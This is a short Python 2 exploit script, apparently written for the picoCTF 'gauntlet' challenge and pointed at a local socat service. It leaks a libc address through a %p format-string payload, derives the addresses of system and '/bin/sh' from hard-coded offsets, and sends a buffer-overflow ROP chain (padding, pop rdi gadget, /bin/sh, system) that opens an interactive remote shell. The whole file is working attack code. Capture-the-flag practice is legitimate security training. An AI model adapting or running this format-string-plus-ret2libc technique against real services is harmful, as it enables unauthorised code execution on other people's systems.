# sudo socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./gauntlet"
import socket
import time
import binascii
import struct
s = socket.socket()
# s.connect(('mercury.picoctf.net', 57648))
s.connect(('localhost', 1337))
# 6th %p is 0x20258 above the stack start
# r = s.recv(1024)
firstString = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%pYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n"
print("[*] Sending first string: " + firstString)
s.send(firstString)
r = ""
while ',' not in r:
    r = s.recv(1024)
print("Address in LibC: " + str(r.split(",")[2]))
startOfLibC = int(r.split(",")[2],16)-1114449
system = startOfLibC + 324944
print("[*] First String Response: " + r)
padding = "A"*120
# padding = "adkjfhkjsdhfkjsdhfkjsdhfkjnkjfghiu8sgowdfniusbvkdmfniheusdfownorfunewofunweiofnwkjakfiasjhfiuusdkfwijkfhwauinfbk"
systemAddr = struct.pack("Q", system)
print(hex(struct.unpack('Q', systemAddr)[0]))
popRDI = struct.pack("Q", int("0x0000000000400793", 16))
print(hex(struct.unpack('Q', popRDI)[0]))
binBash = struct.pack("Q", startOfLibC+1785370)
print(len(binBash))
print(hex(struct.unpack('Q', binBash)[0]))
#         [padding][mov "/bin/sh"][ret to system]
payload = padding + popRDI + binBash + systemAddr +"\n"
print("[*] Payload: " + payload)
raw_input("Send Input?")
s.send(payload)

from telnetlib import Telnet
t = Telnet()
t.sock = s
t.interact()
s.close()